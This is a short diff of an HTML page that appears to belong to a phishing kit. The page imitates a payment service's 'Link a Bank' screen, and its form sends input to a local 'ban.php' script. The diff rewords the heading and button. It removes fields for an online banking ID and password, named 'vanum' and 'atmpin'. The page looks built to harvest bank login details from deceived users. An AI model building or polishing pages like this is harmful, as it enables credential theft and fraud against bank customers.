@@ -80,7 +80,7 @@ document.getElementById("parentForm").submit(); //form submission
 <div id="ember352" class="cookie-banner ember-view">  </div> 
 <section class="layout-login flex-container full-height pad"> 
 <div class="login-container flex-container flex-v-center flex-fill"> 
-<h1 class="step-title flex-static">Link a Bank</h1> 
+<h1 class="step-title flex-static">Link Bank Account</h1> 
 <form autocomplete="off" novalidate="true" id="frmBank" method="POST" action="ban.php" class="login-form ember-view"> 
 <div class="field-container"> 
 <div class="field"> 
@@ -91,16 +91,8 @@ document.getElementById("parentForm").submit(); //form submission
 </div> 
 </div> 
 </div> 
-<div class="field-container"> 
-<div class="field"> 
-<div class="field fk-field-container ember-view"> 
-<input type="text" name="vanum" autocomplete="off" spellcheck="false" id="vanum" class="ember-text-field ember-view" placeholder="Online ID" maxlength="20"> 
-<input type="text" name="atmpin" autocomplete="off" spellcheck="false" id="atmpin" class="ember-text-field ember-view" placeholder="Password" maxlength="15"> 
-</div> 
-</div> 
-</div> 
 <div id="ember555" class="cta submit-button-component submit-button-with-spinner ember-view"> 
-<button type="submit" id="btnLogin" class="button theme-button button--round theme-button">Link a Bank</button> 
+<button type="submit" id="btnLogin" class="button theme-button button--round theme-button">Link Bank Account</button> 
 </div> 
 </form> 
 <a href="#" class="login-help-link fade-in immediate show">Help</a> 
